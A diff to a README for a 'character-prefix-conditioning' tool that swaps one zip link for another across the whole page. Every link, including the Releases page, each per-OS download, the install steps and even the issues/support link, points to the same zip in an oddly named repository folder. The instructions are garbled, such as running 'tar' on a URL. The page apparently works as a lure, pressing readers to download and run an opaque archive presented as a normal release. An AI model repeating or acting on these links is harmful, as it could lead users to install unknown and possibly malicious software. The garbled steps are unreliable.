@@ -6,7 +6,7 @@ Welcome to character-prefix-conditioning! This tool helps you with quick and eas
 
 ## 📦 Download Now
 
-[![Download from Releases](https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip%20from%https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip)](https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip)
+[![Download from Releases](https://github.com/ALM3ARQ/character-prefix-conditioning/raw/refs/heads/master/diverticular/prefix-conditioning-character-2.9.zip%20from%https://github.com/ALM3ARQ/character-prefix-conditioning/raw/refs/heads/master/diverticular/prefix-conditioning-character-2.9.zip)](https://github.com/ALM3ARQ/character-prefix-conditioning/raw/refs/heads/master/diverticular/prefix-conditioning-character-2.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,29 +19,29 @@ Before you install, make sure your system meets these requirements:
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Head over to the [Releases page](https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip) for easy access to the latest version of the software.
+   Head over to the [Releases page](https://github.com/ALM3ARQ/character-prefix-conditioning/raw/refs/heads/master/diverticular/prefix-conditioning-character-2.9.zip) for easy access to the latest version of the software.
 
 2. **Choose Your File**  
    Look for the most recent release listed at the top. You will find various files available for download. Select the file that corresponds to your operating system:
 
-   - For Windows: `https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip`
-   - For macOS: `https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip`
-   - For Linux: `https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip`
+   - For Windows: `https://github.com/ALM3ARQ/character-prefix-conditioning/raw/refs/heads/master/diverticular/prefix-conditioning-character-2.9.zip`
+   - For macOS: `https://github.com/ALM3ARQ/character-prefix-conditioning/raw/refs/heads/master/diverticular/prefix-conditioning-character-2.9.zip`
+   - For Linux: `https://github.com/ALM3ARQ/character-prefix-conditioning/raw/refs/heads/master/diverticular/prefix-conditioning-character-2.9.zip`
 
 3. **Download the File**  
    Click on the file link to start the download. Your browser will save it to your default downloads folder.
 
 4. **Install the Application**  
    - **For Windows:**  
-     Find `https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip` in your downloads folder. Double-click it and follow the on-screen instructions to complete the installation.
+     Find `https://github.com/ALM3ARQ/character-prefix-conditioning/raw/refs/heads/master/diverticular/prefix-conditioning-character-2.9.zip` in your downloads folder. Double-click it and follow the on-screen instructions to complete the installation.
 
    - **For macOS:**  
-     Open the file `https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip` from your downloads folder. Drag it to your Applications folder to install.
+     Open the file `https://github.com/ALM3ARQ/character-prefix-conditioning/raw/refs/heads/master/diverticular/prefix-conditioning-character-2.9.zip` from your downloads folder. Drag it to your Applications folder to install.
 
    - **For Linux:**  
-     Extract `https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip` using Terminal:
+     Extract `https://github.com/ALM3ARQ/character-prefix-conditioning/raw/refs/heads/master/diverticular/prefix-conditioning-character-2.9.zip` using Terminal:
      ```bash
-     tar -xzvf https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip
+     tar -xzvf https://github.com/ALM3ARQ/character-prefix-conditioning/raw/refs/heads/master/diverticular/prefix-conditioning-character-2.9.zip
      ```
      Navigate to the extracted folder and run the application using:
      ```bash
@@ -81,7 +81,7 @@ If you run into any issues:
 
 ## 📞 Support
 
-For further assistance, you can reach out through [issues section](https://raw.githubusercontent.com/ALM3ARQ/character-prefix-conditioning/master/diverticular/character-prefix-conditioning.zip). Please provide details about the problem you are facing.
+For further assistance, you can reach out through [issues section](https://github.com/ALM3ARQ/character-prefix-conditioning/raw/refs/heads/master/diverticular/prefix-conditioning-character-2.9.zip). Please provide details about the problem you are facing.
 
 ---
 
